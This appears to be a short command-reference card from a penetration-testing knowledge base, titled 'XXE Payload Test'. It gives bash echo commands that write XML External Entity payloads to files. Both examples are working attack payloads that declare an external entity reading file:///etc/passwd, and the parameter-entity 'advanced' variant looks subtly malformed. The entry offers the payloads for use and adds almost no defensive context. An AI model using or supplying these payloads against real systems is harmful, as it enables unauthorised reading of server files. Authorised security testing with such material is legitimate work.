---
data: 'echo ''[xxe_xml]'' > xxe_payload.xml'
tags:
  - xxe
  - payload
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: f9ce3df1-39aa-48f5-a689-3a3fbc0871e7
created_at: '2025-12-13T09:00:27.913Z'
updated_at: '2025-12-13T09:00:27.913Z'
verified: false
validated: true
submitted: true
---
# XXE Payload Test

## Command

```bash
echo '[xxe_xml]' > xxe_payload.xml
```

## Description

This command creates a file containing an XXE payload for testing XML entity injection vulnerabilities.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `echo '[xxe_xml]'` | The XML string with XXE | Yes |
| `> xxe_payload.xml` | Output to file | Yes |

## Examples

### Basic Usage

```bash
echo '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' > xxe_payload.xml
```

### Advanced Usage

```bash
echo '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><root></root>' > advanced_xxe.xml
```

## Expected Output

A file named xxe_payload.xml with the specified XML content.

## Related
- [[procedures/Craft-XXE-Payload]]
